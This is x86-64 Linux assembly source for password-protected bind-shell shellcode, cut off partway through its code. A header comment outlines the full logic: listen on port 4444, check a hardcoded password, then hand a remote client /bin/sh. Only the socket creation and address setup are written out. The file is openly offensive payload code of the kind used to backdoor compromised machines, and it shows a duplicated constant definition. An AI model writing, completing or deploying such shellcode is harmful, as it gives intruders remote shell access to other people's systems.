BITS 64
global _start
section .text

; settings
%define     USEPASSWORD
PASSWORD    equ 'Z-r0'
PORT        equ 0x5c11      ; default 4444

; syscall kernel opcodes
SYS_SOCKET  equ 41
SYS_BIND        equ 49
SYS_LISTEN      equ 50
SYS_ACCEPT      equ 43
SYS_ACCEPT      equ 43
SYS_EXECVE      equ 59

; argument constants
AF_INET     equ 2
SOCK_STREAM equ 1

_start:
; High level pseudo C overview of shellcode logic
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; struct sockaddr = {AF_INET;  [PORT; 0x0; 0x0]}
;
; bind(sockfd, &sockaddr, 16)
; listen(sockfd, 0)
; client = accept(sockfd, &sockaddr, 16)
; read(client, *pwbuf, 16)
; if(pwbuf != PASSWORD) goto drop
; 
; dup2(client, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    push SYS_SOCKET
    pop rax
    cdq                 ; rdx = IPPROTP_IP (int: 0)
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    syscall
    
    ; store sock
    push rax
    pop rdi
    
struct_sockaddr:
    ; struct sockaddr = {AF_INET;  [PORT; 0x0; 0x0]}
    
    push rdx
    push rdx
    mov byte [rsp], AF_INET
    mov word [rsp+2], PORT
    push rsp
    pop rsi
    
    

